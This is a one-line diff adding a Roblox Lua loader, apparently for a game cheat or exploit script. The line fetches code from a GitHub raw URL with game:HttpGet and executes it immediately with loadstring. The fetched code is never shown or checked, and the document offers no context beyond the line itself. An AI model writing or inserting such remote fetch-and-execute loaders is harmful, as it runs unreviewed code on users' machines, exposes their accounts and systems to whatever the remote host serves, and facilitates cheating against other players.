@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Slendyvn/Dandy-script/refs/heads/main/E"))()
